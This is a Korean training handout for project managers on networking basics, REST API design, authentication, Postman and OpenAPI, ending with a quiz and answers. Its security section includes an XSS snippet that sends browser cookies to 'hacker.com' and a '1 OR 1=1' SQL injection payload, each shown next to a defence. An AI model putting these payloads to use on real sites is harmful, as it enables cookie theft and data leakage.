# Week 16: 네트워크 기초 상세 강의 자료

## 📚 학습 목표 (상세)
1. **네트워크 기본 개념** 이해 (IP, DNS, HTTP/HTTPS)
2. **PM이 알아야 할 네트워크 용어** 30개 습득
3. **API 및 REST** 기초 이해
4. **네트워크 보안** 기초 (HTTPS, 인증, 인가)
5. **웹 아키텍처** 이해 (클라이언트-서버, CDN)
6. **네트워크 성능** 최적화 기본

---

## 🌐 Part 1: 네트워크 기초

### 1.1 인터넷은 어떻게 작동하는가?

#### 비유로 이해하기

**우편 시스템과 인터넷**:
```
우편:
- 주소: 서울시 강남구 xxx
- 우체국: 라우터
- 우편물: 데이터 패킷

인터넷:
- IP 주소: 192.168.0.1
- 라우터: 데이터 전송 장치
- 패킷: 작은 데이터 조각
```

#### 웹페이지가 로드되는 과정

```
1. 주소 입력
   사용자: www.example.com 입력
   
2. DNS 조회
   DNS 서버: "example.com = 93.184.216.34"
   
3. 서버 연결
   브라우저 → 서버 IP로 연결 요청
   
4. 데이터 요청
   브라우저: "index.html 주세요"
   
5. 데이터 수신
   서버 → HTML, CSS, JS 전송
   
6. 화면 렌더링
   브라우저: 페이지 표시
```

**시간**:
```
총 소요 시간: 약 100-500ms
- DNS 조회: 20-120ms
- 연결: 20-100ms
- 데이터 전송: 50-200ms
- 렌더링: 10-80ms
```

### 1.2 핵심 프로토콜

#### HTTP (HyperText Transfer Protocol)

**요청-응답 모델**:
```
클라이언트 → 서버
GET /index.html HTTP/1.1
Host: www.example.com

서버 → 클라이언트
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```

**HTTP 메서드**:
```
GET: 데이터 조회
POST: 데이터 생성
PUT: 데이터 수정 (전체)
PATCH: 데이터 수정 (일부)
DELETE: 데이터 삭제
```

**HTTP 상태 코드**:
```
2xx (성공)
- 200 OK: 성공
- 201 Created: 생성 성공

3xx (리다이렉트)
- 301 Moved Permanently: 영구 이동
- 302 Found: 임시 이동

4xx (클라이언트 오류)
- 400 Bad Request: 잘못된 요청
- 401 Unauthorized: 인증 필요
- 403 Forbidden: 권한 없음
- 404 Not Found: 찾을 수 없음

5xx (서버 오류)
- 500 Internal Server Error: 서버 오류
- 503 Service Unavailable: 서비스 불가
```

#### HTTPS (HTTP Secure)

**HTTP vs HTTPS**:
```
HTTP:
❌ 평문 전송 (누구나 볼 수 있음)
❌ 중간자 공격 가능
❌ 데이터 변조 가능

HTTPS:
✅ 암호화 전송
✅ 서버 인증
✅ 데이터 무결성
```

**SSL/TLS 인증서**:
```
역할:
1. 암호화
2. 서버 신원 확인
3. 데이터 무결성

발급:
- Let's Encrypt (무료)
- Comodo, DigiCert (유료)

주의:
- 만료 전 갱신 필요
- 모든 페이지에 HTTPS 적용
```

### 1.3 IP 주소와 DNS

#### IP 주소

**IPv4**:
```
형식: 192.168.0.1
- 4개 숫자 (0-255)
- 점(.)으로 구분
- 약 43억 개 주소
```

**IPv6**:
```
형식: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
- 16진수
- 콜론(:)으로 구분
- 거의 무한대 주소
```

**사설 IP vs 공인 IP**:
```
사설 IP:
- 192.168.x.x
- 10.x.x.x
- 내부 네트워크 전용

공인 IP:
- 인터넷에서 접근 가능
- 전세계 고유
- ISP가 할당
```

#### DNS (Domain Name System)

**도메인 구조**:
```
www.example.com

com: TLD (Top-Level Domain)
example: 2nd Level Domain
www: Subdomain
```

**DNS 레코드 타입**:
```
A 레코드: 도메인 → IPv4
AAAA 레코드: 도메인 → IPv6
CNAME: 별칭
MX: 메일 서버
TXT: 텍스트 정보 (SPF, DKIM)
```

---

## 🔌 Part 2: API 기초

### 2.1 API란?

**정의**: Application Programming Interface

**비유**:
```
식당에서:
- 손님: 클라이언트
- 웨이터: API
- 주방: 서버

손님이 직접 주방에 가지 않고
웨이터(API)를 통해 주문
```

**API의 역할**:
```
✅ 프로그램 간 통신
✅ 데이터 교환
✅ 기능 공유
✅ 통합 간소화
```

### 2.2 REST API

#### REST (REpresentational State Transfer)

**원칙**:
```
1. 자원(Resource): URL로 표현
2. 동작(Verb): HTTP 메서드
3. 표현(Representation): JSON, XML

예:
GET /users/123
→ 123번 사용자 정보 조회
```

#### REST API 설계

**좋은 예**:
```
GET    /users          모든 사용자 조회
GET    /users/123      123번 사용자 조회
POST   /users          사용자 생성
PUT    /users/123      123번 사용자 수정
DELETE /users/123      123번 사용자 삭제

GET    /users/123/orders  123번 사용자의 주문 목록
```

**나쁜 예**:
```
GET    /getUsers
POST   /createUser
GET    /deleteUser?id=123  ← 삭제에 GET 사용
POST   /users/123/delete   ← URL에 동사
```

#### API 요청/응답 예시

**요청**:
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer abc123token

{
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30
}
```

**응답**:
```http
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 456,
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30,
  "created_at": "2024-01-15T10:30:00Z"
}
```

### 2.3 GraphQL

**REST vs GraphQL**:
```
REST:
GET /users/123
GET /users/123/posts
GET /users/123/friends
→ 3번 요청

GraphQL:
query {
  user(id: 123) {
    name
    posts { title }
    friends { name }
  }
}
→ 1번 요청
```

**장단점**:
```
GraphQL 장점:
✅ 필요한 데이터만 요청
✅ 단일 요청으로 다중 리소스
✅ 강력한 타입 시스템

GraphQL 단점:
❌ 학습 곡선
❌ 캐싱 복잡
❌ 파일 업로드 어려움
```

### 2.4 API 문서화

**Swagger/OpenAPI 예시**:
```yaml
paths:
  /users:
    get:
      summary: Get all users
      responses:
        200:
          description: Success
          schema:
            type: array
            items:
              $ref: '#/definitions/User'
              
definitions:
  User:
    type: object
    properties:
      id:
        type: integer
      name:
        type: string
      email:
        type: string
```

---

## 🔐 Part 3: 네트워크 보안

### 3.1 인증 vs 인가

**인증 (Authentication)**:
```
질문: "당신은 누구인가?"
방법: 로그인 (아이디 + 비밀번호)
예: "나는 김철수입니다"
```

**인가 (Authorization)**:
```
질문: "무엇을 할 수 있는가?"
방법: 권한 확인
예: "김철수는 관리자 페이지 접근 가능"
```

### 3.2 인증 방법

#### 세션 기반

```
1. 로그인
   클라이언트 → 서버
   POST /login {username, password}

2. 세션 생성
   서버: 세션 ID 생성 및 저장
   
3. 쿠키 전송
   서버 → 클라이언트
   Set-Cookie: sessionId=abc123
   
4. 이후 요청
   클라이언트 → 서버
   Cookie: sessionId=abc123
   
5. 세션 검증
   서버: 세션 ID로 사용자 확인
```

**장단점**:
```
장점:
✅ 서버에서 제어 가능
✅ 로그아웃 즉시 반영

단점:
❌ 서버 부하 (세션 저장)
❌ 확장성 제한
```

#### 토큰 기반 (JWT)

**JWT (JSON Web Token)**:
```
구조:
Header.Payload.Signature

예:
eyJhbGci.eyJ1c2Vy.SflKxwRJ

Payload 내용:
{
  "userId": 123,
  "name": "김철수",
  "exp": 1640000000
}
```

**흐름**:
```
1. 로그인
   클라이언트 → 서버
   
2. 토큰 발급
   서버 → 클라이언트
   JWT 토큰 생성 및 전송
   
3. 이후 요청
   클라이언트 → 서버
   Authorization: Bearer <token>
   
4. 토큰 검증
   서버: 서명 검증
```

**장단점**:
```
장점:
✅ 서버 부하 낮음
✅ 확장성 좋음
✅ 모바일 친화적

단점:
❌ 토큰 탈취 위험
❌ 로그아웃 즉시 반영 어려움
```

### 3.3 보안 위협

#### HTTPS 필수

**중간자 공격 (MITM)**:
```
HTTP:
사용자 → [해커] → 서버
         ↑
      데이터 탈취

HTTPS:
사용자 → [해커] → 서버
      (암호화된 데이터)
```

#### SQL Injection

**취약한 코드**:
```sql
query = "SELECT * FROM users WHERE id = " + userId;

공격:
userId = "1 OR 1=1"
결과: 모든 사용자 정보 유출
```

**안전한 코드**:
```sql
query = "SELECT * FROM users WHERE id = ?"
params = [userId]
```

#### XSS (Cross-Site Scripting)

**공격**:
```html
댓글 입력:
<script>
  // 쿠키 탈취
  fetch('http://hacker.com?cookie=' + document.cookie)
</script>
```

**방어**:
```javascript
// 입력 검증 및 이스케이프
const sanitized = escapeHtml(userInput);
```

---

## 📊 Part 4: 성능 최적화

### 4.1 레이턴시와 처리량

**레이턴시 (Latency)**:
```
정의: 요청부터 응답까지 시간
단위: ms (밀리초)

목표:
- 웹: < 200ms
- API: < 100ms
- 실시간: < 50ms
```

**처리량 (Throughput)**:
```
정의: 단위 시간당 처리량
단위: req/s (초당 요청 수)

목표:
- 소규모: 100 req/s
- 중규모: 1,000 req/s
- 대규모: 10,000+ req/s
```

### 4.2 CDN (Content Delivery Network)

**CDN 없이**:
```
한국 사용자 → 미국 서버
왕복 시간: 200ms
```

**CDN 사용**:
```
한국 사용자 → 한국 CDN
왕복 시간: 20ms
→ 10배 빠름!
```

**동작 원리**:
```
1. 사용자 요청
2. 가장 가까운 CDN 서버
3. 캐시 확인
   - 있으면: 즉시 응답
   - 없으면: 원본 서버에서 가져와 캐시
```

### 4.3 로드 밸런서

**역할**:
```
사용자 요청
     ↓
┌─────────────┐
│Load Balancer│
└─────────────┘
   /    |    \
  /     |     \
서버1  서버2  서버3
```

**알고리즘**:
```
Round Robin: 순서대로 분산
Least Connections: 연결 적은 서버
IP Hash: IP 기반 할당
```

---

## 📋 Part 5: PM이 알아야 할 네트워크 용어 30개

| 용어 | 설명 | PM 관점 |
|-----|------|---------|
| **IP** | 인터넷 주소 | 서버 식별 |
| **DNS** | 도메인 이름 시스템 | 도메인 관리 |
| **HTTP/HTTPS** | 웹 프로토콜 | 보안 필수 |
| **API** | 프로그램 간 통신 | 통합 핵심 |
| **REST** | API 설계 방식 | 표준 규약 |
| **JSON** | 데이터 형식 | API 응답 |
| **SSL/TLS** | 암호화 프로토콜 | 보안 인증서 |
| **쿠키** | 브라우저 저장 데이터 | 세션 유지 |
| **세션** | 로그인 상태 유지 | 인증 관리 |
| **토큰** | 인증 정보 | JWT 활용 |
| **방화벽** | 네트워크 보안 | 접근 통제 |
| **VPN** | 가상 사설망 | 원격 접속 |
| **CDN** | 콘텐츠 전송 네트워크 | 성능 향상 |
| **로드 밸런서** | 트래픽 분산 | 고가용성 |
| **대역폭** | 전송 용량 | 비용 관리 |
| **레이턴시** | 응답 시간 | 사용자 경험 |
| **처리량** | 초당 요청 수 | 용량 계획 |
| **패킷** | 데이터 단위 | 전송 이해 |
| **포트** | 서비스 구분 | 80, 443 |
| **프록시** | 중계 서버 | 보안, 캐싱 |
| **캐시** | 임시 저장 | 성능 개선 |
| **WebSocket** | 양방향 통신 | 실시간 기능 |
| **OAuth** | 인증 프로토콜 | SNS 로그인 |
| **CORS** | 교차 출처 요청 | API 보안 |
| **Webhook** | 이벤트 알림 | 자동화 |
| **NAT** | 주소 변환 | 사설 IP |
| **Subnet** | 네트워크 분할 | 보안 구분 |
| **Gateway** | 네트워크 출입구 | 라우팅 |
| **Ping** | 연결 확인 | 장애 진단 |
| **Traceroute** | 경로 추적 | 네트워크 분석 |

---

## 💼 6. 실습 과제

### 과제 1: API 테스트

**도구**: Postman 또는 curl

**과제**:
1. 공개 API 선택 (예: JSONPlaceholder)
2. 5개 요청 실행:
   - GET: 목록 조회
   - GET: 단일 항목
   - POST: 생성
   - PUT: 수정
   - DELETE: 삭제
3. 응답 분석

**제출물**:
- 요청/응답 스크린샷
- 상태 코드 정리

### 과제 2: 네트워크 진단

**도구**: 
- ping
- traceroute
- nslookup

**과제**:
1. 3개 웹사이트 진단
2. 응답 시간 비교
3. 경로 분석

**제출물**:
- 진단 결과 정리 (1페이지)

### 과제 3: API 설계

**시나리오**: 블로그 시스템

**요구사항**:
- 게시물 CRUD
- 댓글 기능
- 사용자 인증

**과제**:
REST API 엔드포인트 설계

**제출물**:
- API 명세서 (2페이지)

---

## 🔧 Part 6: REST API 설계 심화

### 6.1 RESTful API 설계 원칙 상세

#### 원칙 1: 리소스 중심 설계

**리소스는 명사로 표현**:
```
✅ 좋은 예:
GET  /users              # 사용자 목록
GET  /users/123          # 특정 사용자
POST /users              # 사용자 생성
PUT  /users/123          # 사용자 수정
DELETE /users/123        # 사용자 삭제

❌ 나쁜 예:
GET  /getUsers           # 동사 사용
POST /createUser         # 동사 사용
GET  /user/delete/123    # HTTP 메서드와 불일치
```

#### 원칙 2: 계층 구조 표현

**중첩 리소스**:
```
✅ 좋은 예:
GET  /users/123/posts           # 사용자 123의 게시물 목록
GET  /users/123/posts/456       # 사용자 123의 게시물 456
POST /users/123/posts           # 사용자 123의 게시물 생성
GET  /posts/456/comments        # 게시물 456의 댓글 목록

❌ 나쁜 예:
GET  /getUserPosts?userId=123   # 쿼리 파라미터보다 경로 우선
GET  /posts_by_user_123         # 언더스코어, 사용자 ID 하드코딩
```

**중첩 깊이 제한**:
```
✅ 적절:
/users/123/posts/456/comments     # 3단계 OK

❌ 과도:
/users/123/posts/456/comments/789/replies/101/likes  # 너무 깊음
→ /comments/789/replies/101/likes 로 분리
```

#### 원칙 3: HTTP 메서드 적절히 사용

**CRUD 매핑**:
```
CREATE → POST
READ   → GET
UPDATE → PUT (전체 수정) 또는 PATCH (부분 수정)
DELETE → DELETE
```

**멱등성 (Idempotency) 이해**:
```
멱등: 여러 번 실행해도 결과 동일
- GET, PUT, DELETE: 멱등
- POST: 비멱등 (매번 새 리소스 생성)

예시:
DELETE /users/123  # 여러 번 실행해도 결과 동일 (이미 삭제됨)
POST /users        # 매번 새 사용자 생성
```

#### 원칙 4: 적절한 HTTP 상태 코드 사용

**성공 코드 (2xx)**:
```
200 OK               - 요청 성공 (GET, PUT, PATCH)
201 Created          - 리소스 생성 성공 (POST)
204 No Content       - 성공, 응답 본문 없음 (DELETE)
```

**클라이언트 오류 (4xx)**:
```
400 Bad Request      - 잘못된 요청 (유효성 검사 실패)
401 Unauthorized     - 인증 필요
403 Forbidden        - 권한 없음
404 Not Found        - 리소스 없음
409 Conflict         - 충돌 (중복 생성 시도)
422 Unprocessable    - 유효성 검사 실패 (의미적)
```

**서버 오류 (5xx)**:
```
500 Internal Server Error  - 서버 오류
502 Bad Gateway           - 게이트웨이 오류
503 Service Unavailable   - 서비스 일시 중단
```

#### 원칙 5: 버전 관리

**URL 버전** (권장):
```
https://api.example.com/v1/users
https://api.example.com/v2/users

장점: 명확, 간단
단점: URL 변경 시 클라이언트 수정
```

**헤더 버전**:
```
GET /users
Accept: application/vnd.example.v1+json

장점: URL 변경 없음
단점: 덜 명확
```

#### 원칙 6: 필터링, 정렬, 페이징

**필터링**:
```
GET /users?status=active
GET /users?role=admin&status=active
GET /posts?author=123&category=tech
```

**정렬**:
```
GET /users?sort=created_at
GET /users?sort=-created_at    # 내림차순 (-)
GET /users?sort=name,created_at # 다중 정렬
```

**페이징**:
```
방법 1: Offset-based
GET /users?page=2&limit=20
GET /users?offset=20&limit=20

방법 2: Cursor-based (대용량 데이터)
GET /users?cursor=abc123&limit=20
```

### 6.2 API 응답 설계

#### 일관된 응답 구조

**성공 응답**:
```json
{
  "status": "success",
  "data": {
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com"
  },
  "meta": {
    "timestamp": "2025-02-12T10:30:00Z",
    "version": "v1"
  }
}
```

**목록 응답 (페이징)**:
```json
{
  "status": "success",
  "data": [
    { "id": 1, "name": "User 1" },
    { "id": 2, "name": "User 2" }
  ],
  "pagination": {
    "page": 1,
    "per_page": 20,
    "total": 150,
    "total_pages": 8
  }
}
```

**에러 응답**:
```json
{
  "status": "error",
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "이메일 형식이 올바르지 않습니다.",
    "details": [
      {
        "field": "email",
        "message": "유효한 이메일 주소를 입력하세요."
      }
    ]
  },
  "meta": {
    "timestamp": "2025-02-12T10:30:00Z",
    "request_id": "abc-123-def"
  }
}
```

### 6.3 API 보안

#### 인증 방법

**1. API Key**:
```
GET /users
Authorization: Bearer YOUR_API_KEY

장점: 간단
단점: 키 유출 위험, 사용자별 권한 관리 어려움
```

**2. JWT (JSON Web Token)**:
```
GET /users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

장점: 상태 비저장 (stateless), 확장성
단점: 토큰 크기, 즉시 무효화 어려움
```

**3. OAuth 2.0**:
```
장점: 표준화, 안전, 제3자 인증 지원
단점: 복잡, 구현 부담

사용 사례:
- "Google로 로그인"
- "Facebook으로 로그인"
```

#### API Rate Limiting

**요청 제한**:
```
사용자당 시간당 1,000 요청 제한

응답 헤더:
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1676123456

초과 시:
HTTP 429 Too Many Requests
Retry-After: 3600
```

---

## 📖 Part 7: API 문서화 (Swagger/OpenAPI)

### 7.1 OpenAPI 스펙이란?

**OpenAPI Specification (OAS)**:
- REST API 표준 명세 형식
- 기계 가독 (YAML 또는 JSON)
- Swagger는 OpenAPI 도구 모음

**장점**:
- 자동 문서 생성
- 클라이언트 코드 생성
- API 테스트 도구
- 팀 간 소통 명확

### 7.2 OpenAPI 문서 예시

**간단한 API 명세** (YAML):
```yaml
openapi: 3.0.0
info:
  title: Blog API
  version: 1.0.0
  description: 블로그 시스템 REST API

servers:
  - url: https://api.example.com/v1
    description: Production server

paths:
  /posts:
    get:
      summary: 게시물 목록 조회
      tags:
        - Posts
      parameters:
        - name: page
          in: query
          schema:
            type: integer
            default: 1
        - name: limit
          in: query
          schema:
            type: integer
            default: 20
      responses:
        '200':
          description: 성공
          content:
            application/json:
              schema:
                type: object
                properties:
                  data:
                    type: array
                    items:
                      $ref: '#/components/schemas/Post'
                  pagination:
                    $ref: '#/components/schemas/Pagination'

    post:
      summary: 게시물 생성
      tags:
        - Posts
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/PostCreate'
      responses:
        '201':
          description: 생성 성공
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Post'
        '400':
          description: 잘못된 요청
        '401':
          description: 인증 필요

  /posts/{postId}:
    get:
      summary: 특정 게시물 조회
      tags:
        - Posts
      parameters:
        - name: postId
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: 성공
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Post'
        '404':
          description: 게시물 없음

components:
  schemas:
    Post:
      type: object
      properties:
        id:
          type: integer
          example: 123
        title:
          type: string
          example: "My First Post"
        content:
          type: string
          example: "This is the content..."
        author_id:
          type: integer
          example: 456
        created_at:
          type: string
          format: date-time
          example: "2025-02-12T10:30:00Z"
        updated_at:
          type: string
          format: date-time

    PostCreate:
      type: object
      required:
        - title
        - content
      properties:
        title:
          type: string
          minLength: 1
          maxLength: 200
        content:
          type: string
          minLength: 1

    Pagination:
      type: object
      properties:
        page:
          type: integer
        per_page:
          type: integer
        total:
          type: integer
        total_pages:
          type: integer

  securitySchemes:
    bearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT

security:
  - bearerAuth: []
```

### 7.3 Swagger UI

**Swagger UI**:
- OpenAPI 스펙을 시각적으로 표시
- 브라우저에서 API 테스트 가능
- 자동 생성

**접속 방법**:
```
일반적으로:
https://api.example.com/docs
또는
https://api.example.com/swagger-ui
```

**기능**:
- API 엔드포인트 목록
- 요청/응답 스키마
- "Try it out" 버튼으로 실제 API 호출
- 인증 설정 (API Key, JWT 등)

### 7.4 PM을 위한 API 문서 검토 체크리스트

**문서 완성도**:
- [ ] 모든 엔드포인트 문서화?
- [ ] 요청/응답 예시 포함?
- [ ] 에러 응답 문서화?
- [ ] 인증 방법 명시?

**명세 품질**:
- [ ] HTTP 메서드 적절?
- [ ] 상태 코드 명확?
- [ ] 데이터 타입 명시?
- [ ] 필수/선택 파라미터 구분?

**개발자 경험**:
- [ ] "Try it out" 기능 작동?
- [ ] 예시가 실제와 일치?
- [ ] 용어가 일관성 있나?
- [ ] 버전 정보 명확?

---

## 🔬 Part 8: Postman 실습 가이드

### 8.1 Postman이란?

**Postman**:
- API 개발 및 테스트 도구
- GUI 기반 (개발자가 아니어도 사용 가능)
- 팀 협업 기능
- 무료 버전으로 충분 (개인/소규모 팀)

**다운로드**:
- URL: https://www.postman.com/downloads/
- Windows, Mac, Linux 지원

### 8.2 Postman 기본 사용법

#### Step 1: 첫 요청 만들기

1. **Postman 실행**
2. **"New" → "HTTP Request"** 클릭
3. **요청 설정**:
   ```
   Method: GET
   URL: https://jsonplaceholder.typicode.com/posts/1
   ```
4. **"Send"** 클릭
5. **응답 확인**:
   ```json
   {
     "userId": 1,
     "id": 1,
     "title": "sunt aut...",
     "body": "quia et..."
   }
   ```

#### Step 2: POST 요청 (데이터 생성)

1. **Method**: POST
2. **URL**: `https://jsonplaceholder.typicode.com/posts`
3. **Body 탭** 클릭 → **raw** 선택 → **JSON** 선택
4. **Body 내용**:
   ```json
   {
     "title": "My New Post",
     "body": "This is the content.",
     "userId": 1
   }
   ```
5. **"Send"** 클릭
6. **응답 확인**: 생성된 게시물 (201 Created)

#### Step 3: 인증 설정

**Bearer Token 예시**:
1. **Authorization 탭** 클릭
2. **Type**: Bearer Token
3. **Token**: `your-jwt-token-here`
4. **"Send"** 클릭

**API Key 예시**:
1. **Authorization 탭** 클릭
2. **Type**: API Key
3. **Key**: `X-API-KEY`
4. **Value**: `your-api-key`
5. **Add to**: Header

### 8.3 Collection 사용법

**Collection**:
- 관련 API 요청을 그룹화
- 폴더 구조로 정리
- 팀과 공유 가능

**예시: Blog API Collection**:
```
Blog API
├─ Authentication
│  ├─ Login
│  └─ Logout
├─ Posts
│  ├─ Get All Posts
│  ├─ Get Post by ID
│  ├─ Create Post
│  ├─ Update Post
│  └─ Delete Post
└─ Comments
   ├─ Get Comments
   └─ Create Comment
```

**생성 방법**:
1. 좌측 **"Collections"** → **"+"** 클릭
2. Collection 이름: "Blog API"
3. 폴더 추가: **"Add folder"** → "Posts"
4. 요청 추가: **"Add request"** → "Get All Posts"

### 8.4 Environment 변수

**Environment**:
- 환경별 변수 관리 (Dev, Staging, Production)
- URL, API Key 등을 환경별로 분리

**설정 예시**:
```
Development 환경:
- base_url: https://dev-api.example.com
- api_key: dev-key-123

Production 환경:
- base_url: https://api.example.com
- api_key: prod-key-456
```

**사용 방법**:
1. 우측 상단 **톱니바퀴 아이콘** → **"Manage Environments"**
2. **"Add"** → 환경 이름: "Development"
3. 변수 추가:
   ```
   Variable: base_url
   Initial Value: https://dev-api.example.com
   Current Value: https://dev-api.example.com
   ```
4. 요청 URL에서 사용:
   ```
   {{base_url}}/posts
   ```

### 8.5 테스트 스크립트

**자동화된 검증**:
```javascript
// Tests 탭에 작성

// 상태 코드 확인
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

// 응답 시간 확인
pm.test("Response time is less than 500ms", function () {
    pm.expect(pm.response.responseTime).to.be.below(500);
});

// 응답 본문 확인
pm.test("Response has id field", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData).to.have.property('id');
});

// 응답 데이터 타입 확인
pm.test("ID is a number", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData.id).to.be.a('number');
});
```

### 8.6 PM을 위한 Postman 활용 시나리오

#### 시나리오 1: 개발 진행 상황 확인

**목적**: API가 명세대로 구현되었는지 확인

**절차**:
1. 개발자에게 Postman Collection 요청
2. 각 엔드포인트 테스트
3. 응답이 명세와 일치하는지 확인
4. 문제 발견 시 이슈 등록

#### 시나리오 2: 버그 재현

**목적**: 버그를 명확히 재현하여 개발자에게 전달

**절차**:
1. 문제가 발생한 API 요청 재현
2. 요청/응답 캡처
3. Postman Collection으로 공유
4. 개발자가 동일한 요청으로 디버깅

#### 시나리오 3: 성능 테스트

**목적**: API 응답 시간 모니터링

**절차**:
1. Collection Runner 실행
2. 반복 횟수 설정 (예: 100회)
3. 평균 응답 시간 확인
4. 병목 구간 식별

#### 시나리오 4: 인수 테스트

**목적**: 배포 전 API 기능 검증

**절차**:
1. Staging 환경으로 전환
2. 테스트 시나리오 실행
3. 모든 테스트 통과 확인
4. Production 배포 승인

### 8.7 Postman 고급 기능

**Newman (CLI)**:
```bash
# Postman Collection을 명령줄에서 실행
npm install -g newman

# Collection 실행
newman run Blog_API.postman_collection.json -e Development.postman_environment.json

# CI/CD 파이프라인에 통합 가능
```

**Mock Server**:
- 실제 API 없이 프론트엔드 개발
- Postman에서 Mock Server 생성
- 명세대로 응답 반환

**Monitor**:
- 주기적으로 API 헬스 체크
- 장애 시 알림
- 가동 시간 모니터링

---

## 🎯 7. 자가 점검 퀴즈

### 객관식

**1. HTTP 상태 코드 404의 의미는?**
- A) 성공
- B) 서버 오류
- C) 찾을 수 없음
- D) 권한 없음

**정답**: C

---

**2. REST API에서 데이터 생성 시 사용하는 HTTP 메서드는?**
- A) GET
- B) POST
- C) PUT
- D) DELETE

**정답**: B

---

**3. JWT의 구성 요소가 아닌 것은?**
- A) Header
- B) Payload
- C) Session
- D) Signature

**정답**: C

---

**4. CDN의 주요 목적은?**
- A) 보안 강화
- B) 성능 향상
- C) 비용 절감
- D) 개발 효율

**정답**: B

---

**5. 인증(Authentication)과 인가(Authorization)의 차이는?**
- A) 같은 의미
- B) 인증은 신원 확인, 인가는 권한 확인
- C) 인가가 먼저
- D) 차이 없음

**정답**: B

---

### 서술형

**6. HTTP와 HTTPS의 차이를 보안 관점에서 설명하시오.**

**모범 답안**:
- **HTTP**: 평문 전송, 중간자 공격 취약
- **HTTPS**: SSL/TLS 암호화, 데이터 보호, 서버 인증

---

**7. REST API 설계 원칙 5가지를 나열하시오.**

**모범 답안**:
1. 자원은 명사로 표현
2. HTTP 메서드 활용 (GET, POST, PUT, DELETE)
3. 계층 구조 표현
4. 복수형 사용
5. 버전 관리

---

**8. 세션 기반 인증과 토큰 기반 인증의 장단점을 비교하시오.**

**모범 답안**:

**세션**:
- 장점: 서버 제어, 즉시 로그아웃
- 단점: 서버 부하, 확장성 제한

**토큰**:
- 장점: 서버 부하 낮음, 확장성
- 단점: 탈취 위험, 로그아웃 처리 어려움

---

**9. PM이 API 명세서를 검토할 때 확인해야 할 5가지 항목을 나열하시오.**

**모범 답안**:
1. 엔드포인트 명명 규칙
2. HTTP 메서드 적절성
3. 요청/응답 형식
4. 에러 처리
5. 인증/인가 방식

---

**10. 네트워크 성능 최적화 방법 5가지를 설명하시오.**

**모범 답안**:
1. **CDN 활용**: 지리적 근접성
2. **캐싱**: 반복 요청 감소
3. **압축**: gzip, Brotli
4. **로드 밸런싱**: 트래픽 분산
5. **HTTP/2**: 멀티플렉싱

---

## 📚 8. 핵심 용어 정리

| 한글 | 영문 | 설명 |
|-----|------|------|
| 프로토콜 | Protocol | 통신 규약 |
| 대역폭 | Bandwidth | 전송 용량 |
| 레이턴시 | Latency | 응답 시간 |
| 처리량 | Throughput | 초당 요청 |
| 패킷 | Packet | 데이터 단위 |
| 라우터 | Router | 경로 결정 장치 |
| 방화벽 | Firewall | 보안 장치 |
| 프록시 | Proxy | 중계 서버 |

---

## 🎓 과정 완료

**축하합니다!**

Week 1-16 모든 과정을 완료하셨습니다.

**다음 단계**:
1. 모의 프로젝트 복습
2. 실습 과제 완성
3. PM 자격증 준비 (PMP, CAPM)

---

**강의 자료 버전**: 1.0  
**최종 업데이트**: 2026년 1월  
**작성자**: PM Expert Training Team
